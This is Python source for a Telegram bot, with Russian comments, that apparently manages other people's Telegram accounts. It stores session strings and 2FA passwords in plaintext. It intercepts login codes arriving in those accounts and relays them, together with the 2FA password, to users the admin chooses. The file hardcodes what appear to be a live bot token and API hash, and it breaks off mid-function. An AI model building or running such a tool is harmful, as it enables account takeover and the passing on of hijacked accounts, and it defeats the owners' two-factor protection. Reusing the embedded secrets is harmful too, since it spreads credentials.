import logging
import aiosqlite
import asyncio
import re
import uuid
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    MessageTooLongError,
    FloodWaitError
)
from typing import Optional, List, Dict

# Конфигурация
BOT_TOKEN = "8799691245:AAH-dX7S93l69NRKz_m43xAONQHTghJH9UM"
ADMIN_ID = 8113880731
API_ID = 38770442
API_HASH = "c5b30003cf1e18652ec1d4f8ffc666c7"

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Класс базы данных
class Database:
    def __init__(self, db_path="sessions.db"):
        self.db_path = db_path

    async def init_db(self):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    phone TEXT UNIQUE,
                    session_string TEXT,
                    allowed_users TEXT DEFAULT '',
                    status TEXT DEFAULT 'active',
                    two_fa TEXT,
                    created_at TIMESTAMP,
                    last_used TIMESTAMP,
                    current_user INTEGER,
                    login_request_id TEXT,
                    monitoring_active BOOLEAN DEFAULT 0,
                    notes TEXT
                )
            ''')

            await db.execute('''
                CREATE TABLE IF NOT EXISTS bot_users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    created_at TIMESTAMP
                )
            ''')

            await db.execute('''
                CREATE TABLE IF NOT EXISTS login_requests (
                    id TEXT PRIMARY KEY,
                    session_id INTEGER,
                    user_id INTEGER,
                    status TEXT DEFAULT 'pending',
                    created_at TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES sessions (id)
                )
            ''')

            await db.commit()

    async def add_session(self, phone: str, session_string: str, two_fa: str = None):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "INSERT OR REPLACE INTO sessions (phone, session_string, two_fa, status, created_at) VALUES (?, ?, ?, ?, ?)",
                (phone, session_string, two_fa, 'active', datetime.now())
            )
            await db.commit()

    async def get_sessions(self, page: int = 0, per_page: int = 5) -> List[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            db.row_factory = aiosqlite.Row
            offset = page * per_page
            cursor = await db.execute(
                "SELECT * FROM sessions ORDER BY id DESC LIMIT ? OFFSET ?",
                (per_page, offset)
            )
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]

    async def get_total_sessions(self) -> int:
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute("SELECT COUNT(*) FROM sessions")
            count = await cursor.fetchone()
            return count[0]

    async def add_user_access(self, session_id: int, user_id: int):
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute("SELECT allowed_users FROM sessions WHERE id = ?", (session_id,))
            row = await cursor.fetchone()
            if row:
                allowed = row[0].split(',') if row[0] else []
                if str(user_id) not in allowed:
                    allowed.append(str(user_id))
                    await db.execute(
                        "UPDATE sessions SET allowed_users = ? WHERE id = ?",
                        (','.join(allowed), session_id)
                    )
                    await db.commit()
                    return True
            return False

    async def remove_user_access(self, session_id: int, user_id: int):
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute("SELECT allowed_users FROM sessions WHERE id = ?", (session_id,))
            row = await cursor.fetchone()
            if row:
                allowed = row[0].split(',') if row[0] else []
                if str(user_id) in allowed:
                    allowed.remove(str(user_id))
                    await db.execute(
                        "UPDATE sessions SET allowed_users = ? WHERE id = ?",
                        (','.join(allowed), session_id)
                    )
                    await db.commit()
                    return True
            return False

    async def get_user_allowed_sessions(self, user_id: int) -> List[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM sessions WHERE allowed_users LIKE ?", (f'%{user_id}%',))
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]

    async def get_user_allowed_sessions_count(self, user_id: int) -> int:
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute("SELECT COUNT(*) FROM sessions WHERE allowed_users LIKE ?", (f'%{user_id}%',))
            count = await cursor.fetchone()
            return count[0]

    async def delete_session(self, session_id: int):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute("DELETE FROM sessions WHERE id = ?", (session_id,))
            await db.commit()

    async def get_session_by_id(self, session_id: int) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM sessions WHERE id = ?", (session_id,))
            row = await cursor.fetchone()
            return dict(row) if row else None

    async def get_session_by_phone(self, phone: str) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM sessions WHERE phone = ?", (phone,))
            row = await cursor.fetchone()
            return dict(row) if row else None

    async def update_session_current_user(self, session_id: int, user_id: int):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "UPDATE sessions SET current_user = ?, last_used = ? WHERE id = ?",
                (user_id, datetime.now(), session_id)
            )
            await db.commit()

    async def set_monitoring_active(self, session_id: int, active: bool):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "UPDATE sessions SET monitoring_active = ? WHERE id = ?",
                (1 if active else 0, session_id)
            )
            await db.commit()

    async def create_login_request(self, request_id: str, session_id: int, user_id: int):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "INSERT INTO login_requests (id, session_id, user_id, status, created_at) VALUES (?, ?, ?, ?, ?)",
                (request_id, session_id, user_id, 'pending', datetime.now())
            )
            await db.commit()

    async def update_login_request_status(self, request_id: str, status: str):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "UPDATE login_requests SET status = ? WHERE id = ?",
                (status, request_id)
            )
            await db.commit()

    async def get_login_request(self, request_id: str) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM login_requests WHERE id = ?", (request_id,))
            row = await cursor.fetchone()
            return dict(row) if row else None

    async def add_user(self, user_id: int, username: str, first_name: str, last_name: str):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "INSERT OR REPLACE INTO bot_users (user_id, username, first_name, last_name, created_at) VALUES (?, ?, ?, ?, ?)",
                (user_id, username, first_name, last_name, datetime.now())
            )
            await db.commit()

# Класс для управления сессиями
class SessionManager:
    def __init__(self, db):
        self.db = db
        self.clients = {}
        self.bot = None
        self.pending_codes = {}
        self.monitoring_handlers = {}  # {phone: handler}
        self.active_requests = {}  # {request_id: {'phone': phone, 'user_id': user_id, 'session_id': session_id}}

    def set_bot(self, bot):
        self.bot = bot

    async def ensure_connected(self, client):
        """Проверка и восстановление подключения"""
        try:
            if not client.is_connected():
                await client.connect()
            return True
        except Exception as e:
            logger.error(f"Ошибка подключения: {e}")
            return False

    async def add_session(self, phone: str, session_string: str = None, password: str = None):
        """Добавление новой сессии (только для админа)"""
        try:
            client = TelegramClient(StringSession(session_string) if session_string else StringSession(), API_ID, API_HASH)
            await client.connect()

            if session_string:
                if await client.is_user_authorized():
                    self.clients[phone] = client
                    await self.db.add_session(phone, session_string, two_fa=password)
                    return True, "success"
                else:
                    await client.disconnect()
                    return False, "Недействительная сессия"
            else:
                # Отправляем код для подтверждения (только при добавлении)
                result = await client.send_code_request(phone)
                self.pending_codes[phone] = {
                    'client': client,
                    'phone': phone,
                    'phone_code_hash': result.phone_code_hash
                }
                return True, "code_sent"

        except FloodWaitError as e:
            return False, f"Flood wait: {e.seconds} секунд"
        except Exception as e:
            return False, str(e)

    async def verify_code(self, phone: str, code: str):
        """Подтверждение кода при добавлении сессии"""
        if phone not in self.pending_codes:
            return False, "Сессия не найдена или истекла"

        client = self.pending_codes[phone]['client']
        phone_code_hash = self.pending_codes[phone].get('phone_code_hash')

        try:
            if not await self.ensure_connected(client):
                return False, "Ошибка подключения"

            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            session_str = client.session.save()
            await self.db.add_session(phone, session_str)
            self.clients[phone] = client
            del self.pending_codes[phone]
            return True, "success"

        except SessionPasswordNeededError:
            self.pending_codes[phone]['need_2fa'] = True
            return False, "2fa_needed"
        except Exception as e:
            return False, str(e)

    async def verify_2fa(self, phone: str, password: str):
        """Подтверждение 2FA при добавлении сессии"""
        if phone not in self.pending_codes:
            return False, "Сессия не найдена или истекла"

        client = self.pending_codes[phone]['client']

        try:
            if not await self.ensure_connected(client):
                return False, "Ошибка подключения"

            await client.sign_in(password=password)
            session_str = client.session.save()
            await self.db.add_session(phone, session_str, two_fa=password)
            self.clients[phone] = client
            del self.pending_codes[phone]
            return True, "success"

        except Exception as e:
            return False, str(e)

    async def start_monitoring(self, phone: str, user_id: int, request_id: str):
        """Запуск мониторинга кодов для конкретного пользователя"""
        client = self.clients.get(phone)
        if not client:
            logger.error(f"Клиент для {phone} не найден")
            return False

        session = await self.db.get_session_by_phone(phone)
        if not session:
            return False

        # Сохраняем информацию о запросе
        self.active_requests[request_id] = {
            'phone': phone,
            'user_id': user_id,
            'session_id': session['id'],
            'codes_received': []  # Список полученных кодов
        }

        logger.info(f"Активные запросы после добавления: {list(self.active_requests.keys())}")

        # Отмечаем что мониторинг активен
        await self.db.set_monitoring_active(session['id'], True)
        await self.db.update_session_current_user(session['id'], user_id)

        logger.info(f"Запущен мониторинг кодов для {phone} для пользователя {user_id} с request_id {request_id}")

        # Удаляем предыдущий обработчик если был
        if phone in self.monitoring_handlers:
            client.remove_event_handler(self.monitoring_handlers[phone])

        # Создаем новый обработчик
        @client.on(events.NewMessage)
        async def message_handler(event):
            try:
                # Получаем текст сообщения
                message_text = event.raw_text

                # Проверяем, что сообщение содержит цифры (потенциальный код)
                if message_text and any(c.isdigit() for c in message_text):
                    # Ищем код (4-6 цифр подряд)
                    code_match = re.search(r'\b(\d{4,6})\b', message_text)

                    if code_match:
                        code = code_match.group(1)
                        logger.info(f"Обнаружен код для {phone}: {code}")

                        # Получаем информацию о сессии для проверки 2FA
                        current_session = await self.db.get_session_by_phone(phone)

                        # Проверяем, не был ли уже этот код отправлен
                        if request_id in self.active_requests:
                            if code not in self.active_requests[request_id]['codes_received']:
                                self.active_requests[request_id]['codes_received'].append(code)

                                # Отправляем код пользователю
                                await self.bot.send_message(
                                    user_id,
                                    f"🔐 *Новый код подтверждения*\n\n"
                                    f"📱 Номер: `{phone}`\n"
                                    f"🔢 Код: `{code}`\n\n"
                                    f"Введите этот код в приложении Telegram для входа.\n"
                                    f"Ожидайте подтверждения от администратора.",
                                    parse_mode='md'
                                )

                                # Проверяем статус запроса
                                login_request = await self.db.get_login_request(request_id)

                                if login_request and login_request['status'] == 'pending':
                                    # Уведомляем админа о запросе подтверждения
                                    buttons = [
                                        [
                                            Button.inline("✅ Подтвердить вход", data=f"approve_login_{request_id}"),
                                            Button.inline("❌ Отклонить", data=f"reject_login_{request_id}")
                                        ]
                                    ]

                                    admin_text = (
                                        f"🔔 *Запрос на вход*\n\n"
                                        f"👤 Пользователь: {user_id}\n"
                                        f"📱 Номер: `{phone}`\n"
                                        f"🔢 Код: `{code}`\n"
                                    )

                                    if current_session and current_session['two_fa']:
                                        admin_text += f"🔐 2FA пароль: `{current_session['two_fa']}`\n\n"
                                    else:
                                        admin_text += f"🔐 2FA: Не установлен\n\n"

                                    admin_text += f"Подтвердите вход в аккаунт:"

                                    await self.bot.send_message(
                                        ADMIN_ID,
                                        admin_text,
                                        buttons=buttons,
                                        parse_mode='md'
                                    )
                        else:
                            logger.error(f"Запрос {request_id} не найден в active_requests")

            except Exception as e:
                logger.error(f"Ошибка в мониторинге для {phone}: {e}")

        # Сохраняем обработчик
        self.monitoring_handlers[phone] = message_handler

        return True

    async def approve_login(self, request_id: str):
        """Подтверждение входа админом"""
        logger.info(f"Попытка подтвердить вход для request_id: {request_id}")
        logger.info(f"Активные запросы: {list(self.active_requests.keys())}")

        if request_id not in self.active_requests:
            logger.error(f"Запрос {request_id} не найден в active_requests")
            return False, "Запрос не найден или уже обработан"

        request_info = self.active_requests[request_id]
        phone = request_info['phone']
        user_id = request_info['user_id']
        session_id = request_info['session_id']
        codes_received = request_info.get('codes_received', [])

        try:
            # Обновляем статус в базе
            await self.db.update_login_request_status(request_id, 'approved')

            # Останавливаем мониторинг для этого конкретного запроса
            await self.db.set_monitoring_active(session_id, False)

            # Удаляем из активных запросов
            del self.active_requests[request_id]

            # Отправляем уведомление пользователю
            codes_text = "\n".join([f"🔢 Код {i+1}: `{code}`" for i, code in enumerate(codes_received)])
            await self.bot.send_message(
                user_id,
                f"✅ *Вход подтвержден!*\n\n"
                f"Администратор подтвердил ваш вход в аккаунт `{phone}`.\n\n"
                f"Использованные коды:\n{codes_text}\n\n"
                f"Можете пользоваться аккаунтом.",
                parse_mode='md'
            )

            # Отправляем уведомление админу
            await self.bot.send_message(
                ADMIN_ID,
                f"✅ *Вход подтвержден*\n\n"
                f"Аккаунт `{phone}`\n"
                f"Пользователь: {user_id}\n"
                f"Использованные коды:\n{codes_text}",
                parse_mode='md'
            )

            logger.info(f"Вход подтвержден для request_id {request_id}")
            return True, "Вход подтвержден"

        except Exception as e:
            logger.error(f"Ошибка при подтверждении входа: {e}")
            return False, str(e)

    async def reject_login(self, request_id: str):
        """Отклонение входа админом"""
        logger.info(f"Попытка отклонить вход для request_id: {request_id}")
        logger.info(f"Активные запросы: {list(self.active_requests.keys())}")

        if request_id not in self.active_requests:
            logger.error(f"Запрос {request_id} не найден в active_requests")
            return False, "Запрос не найден или уже обработан"

        request_info = self.active_requests[request_id]
        phone = request_info['phone']
        user_id = request_info['user_id']
        session_id = request_info['session_id']
        codes_received = request_info.get('codes_received', [])

        try:
            # Обновляем статус в базе
            await self.db.update_login_request_status(request_id, 'rejected')

            # Останавливаем мониторинг для этого конкретного запроса
            await self.db.set_monitoring_active(session_id, False)

            # Удаляем из активных запросов
            del self.active_requests[request_id]

            # Отправляем уведомление пользователю
            await self.bot.send_message(
                user_id,
                f"❌ *Вход отклонен!*\n\n"
                f"Администратор отклонил ваш вход в аккаунт `{phone}`.\n"
                f"Попробуйте позже или обратитесь к администратору.",
                parse_mode='md'
            )

            # Отправляем уведомление админу
            codes_text = "\n".join([f"🔢 Код {i+1}: `{code}`" for i, code in enumerate(codes_received)]) if codes_received else "Коды не получены"
            await self.bot.send_message(
                ADMIN_ID,
                f"❌ *Вход отклонен*\n\n"
                f"Аккаунт `{phone}`\n"
                f"Пользователь: {user_id}\n"
                f"Полученные коды:\n{codes_text}",
                parse_mode='md'
            )

            logger.info(f"Вход отклонен для request_id {request_id}")
            return True, "Вход отклонен"

        except Exception as e:
            logger.error(f"Ошибка при отклонении входа: {e}")
            return False, str(e)

    async def stop_monitoring(self, phone: str):
        """Остановка мониторинга"""
        session = await self.db.get_session_by_phone(phone)
        if session:
            await self.db.set_monitoring_active(session['id'], False)

        # Удаляем обработчик
        if phone in self.monitoring_handlers:
            client = self.clients.get(phone)
            if client:
                client.remove_event_handler(self.monitoring_handlers[phone])
            del self.monitoring_handlers[phone]

        logger.info(f"Остановлен мониторинг для {phone}")

    async def remove_session(self, phone: str):
        """Полное удаление сессии"""
        await self.stop_monitoring(phone)
        if phone in self.clients:
            try:
                await self.clients[phone].disconnect()
            except:
                pass
            del self.clients[phone]

# Основной класс бота
class SessionBot:
    def __init__(self):
        self.bot = TelegramClient('bot', API_ID, API_HASH)
        self.db = Database()
        self.session_manager = SessionManager(self.db)
        self.user_states = {}

    async def start(self):
        await self.db.init_db()
        await self.bot.start(bot_token=BOT_TOKEN)
        self.session_manager.set_bot(self.bot)
        await self.load_sessions()
        self.register_handlers()

        logger.info("✅ Бот успешно запущен!")
        print("Бот запущен! Нажмите Ctrl+C для остановки.")
        await self.bot.run_until_disconnected()

    async def load_sessions(self):
        total = await self.db.get_total_sessions()
        if total > 0:
            sessions = await self.db.get_sessions(page=0, per_page=total)
            for session in sessions:
                if session['session_string']:
                    try:
                        client = TelegramClient(StringSession(session['session_string']), API_ID, API_HASH)
                        await client.connect()
                        if await client.is_user_authorized():
                            self.session_manager.clients[session['phone']] = client
                            logger.info(f"✅ Загружена сессия: {session['phone']}")
                        else:
                            await client.disconnect()
                    except Exception as e:
                        logger.error(f"❌ Ошибка загрузки сессии {session['phone']}: {e}")

    def register_handlers(self):

        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            user_id = event.sender_id

            await self.db.add_user(
                user_id,
                event.sender.username,
                event.sender.first_name,
                event.sender.last_name
            )

            if user_id == ADMIN_ID:
                await event.respond(
                    "👋 *Панель администратора*\n\n"
                    "📱 Добавить сессию - добавить новый аккаунт\n"
                    "📋 Список сессий - управление доступом\n"
                    "📊 Статистика - информация о системе",
                    buttons=self.get_admin_keyboard(),
                    parse_mode='md'
                )
            else:
                await self.show_user_sessions(event, user_id)

        @self.bot.on(events.NewMessage(pattern='📱 Добавить сессию'))
        async def add_session_handler(event):
            if event.sender_id != ADMIN_ID:
                return

            self.user_states[event.sender_id] = {'state': 'waiting_phone'}
            await event.respond(
                "📱 *Добавление новой сессии*\n\n"
                "Введите номер телефона в международном формате:\n"
                "Например: `+380501234567`",
                parse_mode='md'
            )

        @self.bot.on(events.NewMessage(pattern='📋 Список сессий'))
        async def list_sessions_handler(event):
            if event.sender_id != ADMIN_ID:
                return

            await self.show_admin_sessions(event, 0)

        @self.bot.on(events.NewMessage(pattern='📊 Статистика'))
        async def stats_handler(event):
            if event.sender_id != ADMIN_ID:
                return

            total = await self.db.get_total_sessions()
            active = len([c for c in self.session_manager.clients.values() if c.is_connected()])

            async with aiosqlite.connect(self.db.db_path) as db:
                cursor = await db.execute("SELECT COUNT(*) FROM bot_users")
                users_count = (await cursor.fetchone())[0]

            stats_text = (
                "📊 *Статистика системы*\n\n"
                f"📱 Всего сессий: {total}\n"
                f"✅ Активных: {active}\n"
                f"👥 Пользователей: {users_count}"
            )

            await event.respond(stats_text, parse_mode='md')

        @self.bot.on(events.CallbackQuery)
        async def callback_handler(event):
            data = event.data.decode()
            user_id = event.sender_id

            try:
                if user_id == ADMIN_ID:
                    if data.startswith('admin_page_'):
                        page = int(data.split('_')[2])
                        await self.show_admin_sessions(event, page)

                    elif data.startswith('session_'):
                        session_id = int(data.split('_')[1])
                        session = await self.db.get_session_by_id(session_id)

                        if session:
                            allowed_users = session['allowed_users'].split(',') if session['allowed_users'] else []
                            is_connected = session['phone'] in self.session_manager.clients and self.session_manager.clients[session['phone']].is_connected()

                            text = (
                                f"📱 *Управление доступом*\n\n"
                                f"📞 Номер: `{session['phone']}`\n"
                                f"👥 Пользователей с доступом: {len(allowed_users)}\n"
                                f"📊 Статус: {'✅ Активен' if is_connected else '❌ Не активен'}\n"
                                f"🔐 2FA: {'✅ Установлен' if session['two_fa'] else '❌ Не установлен'}\n"
                            )

                            buttons = [
                                [Button.inline("➕ Добавить пользователя", data=f"add_user_{session_id}")],
                                [Button.inline("👥 Список пользователей", data=f"list_users_{session_id}")],
                                [Button.inline("❌ Удалить сессию", data=f"delete_{session_id}")],
                                [Button.inline("🔙 Назад", data="back_to_admin")]
                            ]

                            await event.edit(text, buttons=buttons, parse_mode='md')

                    elif data.startswith('add_user_'):
                        session_id = int(data.split('_')[2])
                        self.user_states[user_id] = {'state': 'waiting_user_id', 'session_id': session_id}
                        await event.edit(
                            f"👤 Введите ID пользователя Telegram для предоставления доступа:",
                            buttons=[[Button.inline("🔙 Отмена", data="cancel")]]
                        )

                    elif data.startswith('list_users_'):
                        session_id = int(data.split('_')[2])
                        session = await self.db.get_session_by_id(session_id)

                        if session:
                            allowed_users = session['allowed_users'].split(',') if session['allowed_users'] else []

                            if allowed_users:
                                text = f"👥 *Пользователи с доступом к {session['phone']}*\n\n"
                                buttons = []

                                for uid in allowed_users:
                                    text += f"• ID: `{uid}`\n"
                                    buttons.append([Button.inline(f"❌ Убрать {uid}", data=f"remove_user_{session_id}_{uid}")])

                                buttons.append([Button.inline("🔙 Назад", data=f"session_{session_id}")])
                                await event.edit(text, buttons=buttons, parse_mode='md')
                            else:
                                await event.answer("❌ Нет пользователей с доступом", alert=True)

                    elif data.startswith('remove_user_'):
                        parts = data.split('_')
                        session_id = int(parts[2])
                        target_user = int(parts[3])

                        await self.db.remove_user_access(session_id, target_user)
                        await event.answer(f"✅ Доступ пользователя {target_user} удален", alert=True)

                        # Показываем обновленный список
                        session = await self.db.get_session_by_id(session_id)
                        if session:
                            allowed_users = session['allowed_users'].split(',') if session['allowed_users'] else []
                            if allowed_users:
                                text = f"👥 *Пользователи с доступом к {session['phone']}*\n\n"
                                buttons = []

                                for uid in allowed_users:
                                    text += f"• ID: `{uid}`\n"
                                    buttons.append([Button.inline(f"❌ Убрать {uid}", data=f"remove_user_{session_id}_{uid}")])

                                buttons.append([Button.inline("🔙 Назад", data=f"session_{session_id}")])
                                await event.edit(text, buttons=buttons, parse_mode='md')
                            else:
                                await event.edit(
                                    f"👥 *Пользователи с доступом к {session['phone']}*\n\n"
                                    f"Нет пользователей с доступом",
                                    buttons=[[Button.inline("🔙 Назад", data=f"session_{session_id}")]],
                                    parse_mode='md'
                                )

                    elif data.startswith('delete_'):
                        session_id = int(data.split('_')[1])
                        session = await self.db.get_session_by_id(session_id)

                        if session:
                            await self.session_manager.remove_session(session['phone'])
                            await self.db.delete_session(session_id)
                            await event.answer("✅ Сессия удалена", alert=True)
                            await self.show_admin_sessions(event, 0)

                    elif data.startswith('approve_login_'):
                        # Получаем полный request_id (он может содержать подчеркивания)
                        request_id = data[14:]  # Убираем 'approve_login_'
                        logger.info(f"Получен approve_login с request_id: {request_id}")

                        success, message = await self.session_manager.approve_login(request_id)

                        if success:
                            await event.answer("✅ Вход подтвержден", alert=True)
                            await event.delete()
                        else:
                            await event.answer(f"❌ Ошибка: {message}", alert=True)

                    elif data.startswith('reject_login_'):
                        # Получаем полный request_id (он может содержать подчеркивания)
                        request_id = data[13:]  # Убираем 'reject_login_'
                        logger.info(f"Получен reject_login с request_id: {request_id}")

                        success, message = await self.session_manager.reject_login(request_id)

                        if success:
                            await event.answer("❌ Вход отклонен", alert=True)
                            await event.delete()
                        else:
                            await event.answer(f"❌ Ошибка: {message}", alert=True)

                    elif data == 'back_to_admin':
                        await self.show_admin_sessions(event, 0)

                else:  # Обычный пользователь
                    if data.startswith('user_page_'):
                        page = int(data.split('_')[2])
                        await self.show_user_sessions(event, user_id, page)

                    elif data.startswith('select_session_'):
                        session_id = int(data.split('_')[2])
                        session = await self.db.get_session_by_id(session_id)

                        if session:
                            text = (
                                f"📱 *Аккаунт*\n\n"
                                f"📞 Номер: `{session['phone']}`\n"
                            )

                            if session['two_fa']:
                                text += f"🔐 2FA пароль: `{session['two_fa']}`\n\n"
                            else:
                                text += f"🔐 2FA: Не установлен\n\n"

                            text += f"Нажмите кнопку ниже, чтобы начать мониторинг кодов для этого аккаунта.\n"
                            text += f"Когда вы попытаетесь зайти в Telegram, код придет сюда автоматически."

                            buttons = [
                                [Button.inline("🔑 Начать мониторинг кодов", data=f"start_monitor_{session_id}")],
                                [Button.inline("🔙 Назад", data=f"back_to_user_{user_id}")]
                            ]

                            await event.edit(text, buttons=buttons, parse_mode='md')

                    elif data.startswith('start_monitor_'):
                        session_id = int(data.split('_')[2])
                        session = await self.db.get_session_by_id(session_id)

                        if session and session['phone'] in self.session_manager.clients:
                            # Создаем уникальный request_id
                            request_id = f"req_{user_id}_{session_id}_{datetime.now().timestamp()}"
                            logger.info(f"Создан новый request_id: {request_id}")

                            await self.db.create_login_request(request_id, session_id, user_id)

                            # Запускаем мониторинг
                            success = await self.session_manager.start_monitoring(
                                session['phone'],
                                user_id,
                                request_id
                            )

                            if success:
                                # Показываем информацию с 2FA
                                text = (
                                    f"🔄 *Мониторинг запущен*\n\n"
                                    f"Аккаунт: `{session['phone']}`\n"
                                )

                                if session['two_fa']:
                                    text += f"🔐 2FA пароль: `{session['two_fa']}`\n\n"
                                else:
                                    text += f"🔐 2FA: Не установлен\n\n"

                                text += f"Теперь попробуйте зайти в Telegram с этого аккаунта.\n"
                                text += f"Когда придет код подтверждения, я автоматически отправлю его сюда.\n\n"
                                text += f"*Важно:* Ожидайте подтверждения от администратора. "
                                text += f"Сессия останется активной до вашего подтверждения."

                                await event.edit(text, parse_mode='md')
                            else:
                                await event.answer("❌ Не удалось запустить мониторинг", alert=True)
                        else:
                            await event.answer("❌ Аккаунт не активен", alert=True)

                    elif data.startswith('back_to_user_'):
                        await self.show_user_sessions(event, user_id, 0)

                    elif data == 'refresh_user':
                        await self.show_user_sessions(event, user_id, 0)

                if data == 'cancel':
                    if user_id in self.user_states:
                        del self.user_states[user_id]
                    await event.delete()

            except MessageTooLongError:
                await event.answer("❌ Ошибка: сообщение слишком длинное", alert=True)
            except Exception as e:
                await event.answer("❌ Произошла ошибка", alert=True)
                logger.error(f"Ошибка в callback_handler: {e}")

        @self.bot.on(events.NewMessage)
        async def message_handler(event):
            if event.message.text.startswith('/'):
                return

            user_id = event.sender_id
            text = event.message.text

            if user_id in self.user_states:
                state = self.user_states[user_id]

                if state['state'] == 'waiting_phone':
                    phone = re.sub(r'\D', '', text)
                    if len(phone) >= 10:
                        if not phone.startswith('+'):
                            phone = '+' + phone

                        result, message = await self.session_manager.add_session(phone)

                        if result and message == "code_sent":
                            await event.respond(
                                f"📱 Код отправлен на номер {phone}\n\nВведите код из SMS:"
                            )
                            self.user_states[user_id] = {'state': 'waiting_code', 'phone': phone}
                        else:
                            await event.respond(f"❌ Ошибка: {message}")
                            del self.user_states[user_id]
                    else:
                        await event.respond("❌ Неверный формат номера")

                elif state['state'] == 'waiting_code':
                    phone = state['phone']
                    code = text.strip()

                    if code.isdigit() and len(code) >= 4:
                        result, message = await self.session_manager.verify_code(phone, code)

                        if result:
                            await event.respond("✅ Сессия успешно добавлена!\n\nТеперь вы можете добавить пользователей для доступа к этому аккаунту.")
                            del self.user_states[user_id]
                        elif message == "2fa_needed":
                            await event.respond("🔐 Требуется двухфакторная аутентификация. Введите пароль 2FA:")
                            self.user_states[user_id] = {'state': 'waiting_2fa', 'phone': phone}
                        else:
                            await event.respond(f"❌ Ошибка: {message}")
                    else:
                        await event.respond("❌ Неверный формат кода")

                elif state['state'] == 'waiting_2fa':
                    phone = state['phone']
                    password = text

                    result, message = await self.session_manager.verify_2fa(phone, password)

                    if result:
                        await event.respond("✅ Сессия успешно добавлена с 2FA!\n\nТеперь вы можете добавить пользователей для доступа к этому аккаунту.")
                        del self.user_states[user_id]
                    else:
                        await event.respond(f"❌ Ошибка: {message}")

                elif state['state'] == 'waiting_user_id':
                    try:
                        target_user_id = int(text)
                        session_id = state['session_id']

                        await self.db.add_user_access(session_id, target_user_id)

                        await event.respond(f"✅ Доступ к аккаунту предоставлен пользователю {target_user_id}")
                        del self.user_states[user_id]

                        # Показываем обновленную информацию о сессии
                        session = await self.db.get_session_by_id(session_id)
                        if session:
                            allowed_users = session['allowed_users'].split(',') if session['allowed_users'] else []
                            is_connected = session['phone'] in self.session_manager.clients and self.session_manager.clients[session['phone']].is_connected()

                            text = (
                                f"📱 *Управление доступом*\n\n"
                                f"📞 Номер: `{session['phone']}`\n"
                                f"👥 Пользователей с доступом: {len(allowed_users)}\n"
                                f"📊 Статус: {'✅ Активен' if is_connected else '❌ Не активен'}\n"
                                f"🔐 2FA: {'✅ Установлен' if session['two_fa'] else '❌ Не установлен'}\n"
                            )

                            buttons = [
                                [Button.inline("➕ Добавить пользователя", data=f"add_user_{session_id}")],
                                [Button.inline("👥 Список пользователей", data=f"list_users_{session_id}")],
                                [Button.inline("❌ Удалить сессию", data=f"delete_{session_id}")],
                                [Button.inline("🔙 Назад", data="back_to_admin")]
                            ]

                            await event.respond(text, buttons=buttons, parse_mode='md')
                    except ValueError:
                        await event.respond("❌ Введите корректный числовой ID")

    async def show_admin_sessions(self, event, page: int):
        total = await self.db.get_total_sessions()
        per_page = 5
        total_pages = (total + per_page - 1) // per_page if total > 0 else 1

        if page >= total_pages:
            page = total_pages - 1
        if page < 0:
            page = 0

        sessions = await self.db.get_sessions(page=page, per_page=per_page)

        if not sessions:
            await event.respond("📋 Список сессий пуст")
            return

        text = f"📋 *Список сессий* (стр. {page+1}/{total_pages})\n\n"

        buttons = []
        for session in sessions:
            allowed = len(session['allowed_users'].split(',')) if session['allowed_users'] else 0
            is_connected = session['phone'] in self.session_manager.clients and self.session_manager.clients[session['phone']].is_connected()
            status = "✅" if is_connected else "❌"
            monitoring = "👁️" if session.get('monitoring_active') else ""
            twofa = "🔐" if session['two_fa'] else ""
            buttons.append([Button.inline(
                f"{status} {session['phone']} | 👥 {allowed} {monitoring} {twofa}",
                data=f"session_{session['id']}"
            )])

        nav_buttons = []
        if page > 0:
            nav_buttons.append(Button.inline("⬅️", data=f"admin_page_{page-1}"))

        nav_buttons.append(Button.inline(f"📄 {page+1}/{total_pages}", data="info"))

        if page < total_pages - 1:
            nav_buttons.append(Button.inline("➡️", data=f"admin_page_{page+1}"))

        buttons.append(nav_buttons)

        if isinstance(event, events.CallbackQuery.Event):
            await event.edit(text, buttons=buttons, parse_mode='md')
        else:
            await event.respond(text, buttons=buttons, parse_mode='md')

    async def show_user_sessions(self, event, user_id: int, page: int = 0):
        sessions = await self.db.get_user_allowed_sessions(user_id)

        if not sessions:
            await event.respond(
                "📱 *Нет доступных аккаунтов*\n\n"
                "У вас пока нет доступа к аккаунтам. Обратитесь к администратору.",
                parse_mode='md'
            )
            return

        per_page = 5
        total_pages = (len(sessions) + per_page - 1) // per_page
        start_idx = page * per_page
        end_idx = start_idx + per_page
        page_sessions = sessions[start_idx:end_idx]

